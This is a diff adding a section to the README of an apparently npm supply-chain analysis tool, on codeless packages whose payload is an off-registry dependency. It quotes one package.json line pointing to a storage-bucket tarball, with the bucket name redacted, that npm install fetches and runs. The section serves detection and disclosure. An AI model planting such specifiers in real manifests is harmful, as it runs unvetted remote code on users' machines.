@@ -32,6 +32,41 @@ typosquatting and dependency confusion: a different problem needing a different
 tool. Full statement, with the two cases it failed on and their scores, in
 [docs/scope.md](docs/scope.md).
 
+### A package with no code in it
+
+There is a third class, and it defeats every content-based analysis including
+this one. Stated here rather than in a footnote because the corpus contains a
+worked example.
+
+Eight packages published in August 2026 were, in full, 35 bytes:
+
+```js
+'use strict';
+module.exports = {};
+```
+
+No install script. Nothing to reach, nothing to hide, nothing obfuscated — and
+the tool is right about all of that. The payload was one line of `package.json`:
+
+```json
+"dependencies": { "ltidisafe": "https://<bucket>.storage.googleapis.com/…/ltidisafe-3.7.4.tgz" }
+```
+
+`npm install` fetches that tarball and runs it. Every question this tool asks
+about contents — what does it reach, what can it do, how much of it can be read —
+returns "this package does nothing", correctly.
+
+**And npm's own remediation does not reach it either.** The registry removed all
+eight packages; the bucket was unaffected. A takedown reaches what the registry
+hosts, and an off-registry dependency is hosted somewhere else.
+
+What is measurable without reading any content is that the specifier is not a
+registry range at all. Over 25,394 publications covering 13,344 distinct names,
+42 names (0.315%) declare one, across five destinations — `file:` links,
+`github:` shorthand, a vendor that distributes off-registry deliberately, and one
+bucket. See [docs/audit-a5.md](docs/audit-a5.md) and
+[docs/disclosure-ltidi.md](docs/disclosure-ltidi.md).
+
 ## Install
 
 ```bash
